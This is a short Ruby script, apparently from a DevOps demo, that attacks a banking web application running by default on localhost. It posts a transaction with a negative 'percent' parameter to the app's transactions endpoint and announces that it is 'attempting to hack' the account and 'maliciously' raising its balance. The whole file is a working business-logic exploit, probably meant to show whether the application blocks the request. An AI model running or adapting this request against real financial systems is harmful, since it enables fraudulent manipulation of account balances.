#!/usr/bin/env ruby

#$LOAD_PATH << File.expand_path( File.join(File.dirname(__FILE__), '..', 'com.ibm.devops.common.ruby', 'devops_deployment_lib', 'lib' ))

################################################################################
# Dependencies                                                                 #
################################################################################

require "rubygems"
require "getoptlong" # for handling arguments
require "uri"
require "logger" # Ruby Logging
# gem install httpclient
require "httpclient"
require "httpclient/http" # Contains a list of HTTP Codes represented as Ruby Constants
require 'json' # JSON parsing

 # HTTP Header Names
HTTP_ACCEPT = "Accept"
HTTP_CONTENT_TYPE = "Content-Type"
HTTP_ACCEPT_LANGUAGE = "Accept-Language"

# HTTP Header Values
APPLICATION_JSON = "application/json"
APPLICATION_WWWFORM = "application/x-www-form-urlencoded"
LANGUAGE_EN = "en"

def main 
      
   host = nil
   account = nil
   amount = nil
   response = nil
   opts = GetoptLong.new(
      [ '--host', '-h', GetoptLong::REQUIRED_ARGUMENT ],
      [ '--account', '-A', GetoptLong::OPTIONAL_ARGUMENT ],
      [ '--amount', '-a', GetoptLong::OPTIONAL_ARGUMENT ]
    )
    
  opts.each do |opt, arg|
      case opt
        when '--host'
          host = arg
        when '--account'
          account = arg
        when '--amount'
          amount = arg
      end
    end
    
    if host.nil? 
      #puts "No host provided. Defaulting to \"localhost\".""
      host = "localhost"
    end
    
    if account.nil? 
     account = 200
    end
    
    if amount.nil?
      amount = 5
    end
    
    header = {
            HTTP_ACCEPT => APPLICATION_WWWFORM,
            HTTP_ACCEPT_LANGUAGE => LANGUAGE_EN
          }
    
    http_client = HTTPClient.new
    puts "Logging in to account #{account}..."
    sleep 1
    puts "Attempting to hack account..."
    sleep 1
    response = http_client.post("http://#{host}:8080/transactions/create?account=#{account}&org=Salvation%20Army&date=31+Aug+2010&percent=-#{amount}", :header => header)
    
    # puts response.inspect
    
    #puts "Received response: #{response.status} (#{response.status_code})"
    if response.status == HTTP::Status::OK 
      puts "Success! Your account balance has been (maliciously) incremented #{amount} percent!"
    else
      puts "Doh! The application denied your request! Your account balance remains unchanged."
    end
  
end

################################################################################
# Main Method                                                                  #
################################################################################
if __FILE__ == $PROGRAM_NAME
   main
   exit(0)
end
